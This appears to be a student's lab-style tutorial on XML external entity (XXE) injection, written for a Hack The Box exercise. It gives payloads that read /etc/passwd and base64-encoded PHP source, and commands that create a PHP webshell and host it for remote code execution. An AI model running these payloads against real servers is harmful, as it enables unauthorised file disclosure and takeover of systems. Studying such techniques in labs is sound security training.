XML is a common markup language desinged for flexible transfer and storage of data and documents, however, when a user-controlled input is not properly sanitized of parsed, as a result XXE Injection would allow us to perform malicious action

Local File Disclosure with XXE:

First, we need to find a webpage that actually accepts XML user input, this can be verified in burp suite whenever we attempt to send data to webserver and intercept with burp, we also need to note for which element is being displayed to us, else we can't disclose files

After locating it, we can add a new entity inside to see if it indeed display what we typed in like in the following example (assuming email got displayed):
```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

After confirming the vulnerability, then we can start exploiting by using SYSTEM keyword and include a local file:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Disclosing Source Code:

Our attempt to use the above method to display any source code will not be succeed, as the file contains XML special character and it is not in a proper xml format, with cases like these we would have to use php filter like in the following manner:
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

RCE with XXE Injection:

To perform RCE with XXE Injection, we would require the presence of php expect module, if it is present, we can host a webserver containing a webshell, and have it executed and referenced in the following manner:
```
Avalon112@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
Avalon112@htb[/htb]$ sudo python3 -m http.server 80
#Hosting WebServer
```